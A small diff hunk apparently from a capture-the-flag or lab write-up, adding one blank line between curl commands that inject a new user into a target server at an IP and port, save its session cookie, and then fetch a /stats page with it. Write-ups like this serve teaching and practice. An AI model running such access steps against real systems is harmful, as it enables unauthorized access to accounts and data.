@@ -86,6 +86,7 @@ Inject the new User to the server for getting access and store cookie data
 -d '{"username": "kittykat", "password": "kittykat"}' \
 -c cookie.txt
 `
+
 Run the following command to get cookie data.
 
 `curl -X GET "http://94.237.59.207:47563/stats" -b cookie.txt`
